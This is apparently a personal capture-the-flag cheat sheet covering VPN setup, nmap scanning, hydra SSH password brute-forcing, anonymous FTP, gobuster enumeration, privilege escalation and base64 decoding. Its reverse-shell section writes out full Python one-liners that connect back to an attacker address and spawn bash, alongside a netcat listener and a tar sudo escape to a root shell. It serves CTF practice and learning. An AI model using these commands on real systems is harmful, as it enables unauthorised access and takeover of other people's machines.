# CTF-Notes

# How to connect to the vpn

**Use the command:**```openvpn [YOUR .ovpn FILE]```

# How to check if we are properly connected?

**Use the command:**```ping [IP]```

# Get my IP

We can do ```ip addr show tun0``` or ```ifconfig```

# Check if input allows python/python3

We can do ```python -c "print('Hello')"``` or ```python3 -c "print('Hello')"```

# Make a python script executable from command line

 1. Add ```#!/usr/bin/env python``` at the beginning of the script
 2. Make the file executable ```chmod +x myfile.py```
 3. Execute the script ```./myfile.py```

# If commands like "cat" are not allowed

We can use ```grep . file``` or ```while read line; do echo $line; done < file```

# PORTS

* **Check for open ports:** ```nmap [IP]``` [Guide](https://www.stationx.net/nmap-cheat-sheet/)

* **Types of ports and how to access them:** <br>
  * **Port 80:** Usually http
  * **Port 22:** Usually ssh
    * You can use the command ```ssh```
      * ```ssh [USERNAME]@[IP]```
      * It will ask for a password:
        * We can try and crack the password like: ```hydra -l [USERNAME | WORDLIST] -P [PASSWORD | WORDLIST] [IP] ssh```
  * **Port 21:** Usually ftp
    * You can use the command ```ftp```
      * ```ftp [IP]```
        * It will ask for logging information but you can sometimes use: ```anonymous``` without password
        * You can retrieve files inside ftp using  ```get```: ```get flag.txt```
        
# URL Directory Enumeration

* You can run the following command to enumerate the directories of a given URL:
  * ```gobuster dir -u "[URL | IP]" -w [Wordlist] ``` [Guide](https://redteamtutorials.com/2018/11/19/gobuster-cheatsheet/)
  
# Reverse Shell:

* If a website allows input or file upload without sanitation it will be possible to upload a reverse shell in order to gain access to the system.
  * **Upload the shell:**
    * File upload shell: <a href="php-reverse-shell.php">PHP shell</a> <- We must modify the IP(Our IP) and the PORT(9999)
    * Reverse shell in input: [More one liner shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
      * If python is allowed: ```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[IP]",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'```
      * If python3 is allowed: ```python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[IP]",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'```
  * **Access the shell:**
    * ```nc -lnvp [PORT]``` [Guide](https://linuxize.com/post/netcat-nc-command-with-examples/)
  * **Stabilize the shell:**
    1. Inside the shell ```python -c 'import pty; pty.spawn(\"/bin/bash\")'```
    2. Ctrl+Z
    3. ```stty raw -echo```
    4. ```fg```
    5. ```export TERM=xterm```
                    
# Privilage Escalation

* If you are inside of the vulnerable system you can try to escalate your user privilege as root like:
  * Use ```sudo -l``` to see what types of privileges the user has.
    * If you see ```(ALL : ALL) ALL```, just call ```sudo bash``` and you will become root.
    * Other privileges: [Check for exploits](https://gtfobins.github.io/)
      * tar: ```sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh```
      
# Find all files in system by name.

We can do ```find / -name [FILENAME]``` or ```find /* | grep [FILENAME]```

# Criptography

* **Base 64:** If we see a combination of letters and numbers, it may be Base 64 encoding, the best way to find out if it contains at least one '=' at the end.
  * How to decypher:
    * In linux: ```echo [BASE64 STRING] | base64 -d``` 
    * Online: [Cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true))
